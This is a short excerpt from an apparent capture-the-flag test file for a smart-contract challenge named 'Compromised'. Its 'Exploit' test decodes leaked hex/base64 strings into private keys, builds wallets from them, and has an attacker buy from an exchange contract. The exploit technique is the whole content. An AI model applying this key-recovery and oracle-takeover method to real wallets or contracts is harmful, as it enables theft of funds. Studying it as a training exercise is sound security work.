...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    const privKeys = leaked.map((l) =>
      Buffer.from(
        Buffer.from(l.split(" ").join(""), "hex").toString("utf8"),
        "base64"
      ).toString("utf8")
    );

    const wallet1 = new ethers.Wallet(privKeys[0], ethers.provider);
    const wallet2 = new ethers.Wallet(privKeys[1], ethers.provider);
    ...
    const tokenId = await this.exchange
      .connect(attacker)
      .callStatic.buyOne({ value: ethers.utils.parseEther("0.01") });
